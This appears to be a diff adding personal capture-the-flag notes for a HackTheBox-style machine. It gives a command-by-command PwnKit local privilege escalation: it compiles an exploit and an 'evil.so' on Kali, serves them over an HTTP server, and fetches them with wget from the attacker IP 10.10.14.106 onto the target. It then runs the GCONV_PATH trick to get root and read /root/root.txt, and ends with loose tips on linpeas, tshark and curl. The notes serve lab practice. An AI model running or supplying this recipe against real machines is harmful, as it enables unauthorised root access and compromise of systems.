@@ -1,0 +1,49 @@
+On Kali:
+
+https://packetstorm.news/files/id/165739
+
+cd ~/Desktop/htb/htb2/again
+
+gcc -shared -fPIC -o evil.so evil-so.c
+gcc exploit.c -o exploit
+
+python3 -m http.server 8000
+
+
+Then on the target:
+
+```bash id="q4p7ls"
+cd /tmp
+
+wget http://10.10.14.106:8000/exploit
+wget http://10.10.14.106:8000/evil.so
+
+chmod +x exploit
+
+mkdir -p 'GCONV_PATH=.'
+cp /usr/bin/true 'GCONV_PATH=./evil.so:.'
+
+echo 'module UTF-8// PWNKIT// evil 2' > gconv-modules
+
+./exploit
+```
+
+If successful:
+
+```bash id="m1v9dx"
+id
+cat /root/root.txt
+```
+
+
+
+/etc/hosts
+
+make sure to run linpeas
+
+if web page is not accessible use curl with request forwdaers
+
+tshark is to analyse packets
+
+make sure to see every download any hyper link properly
+
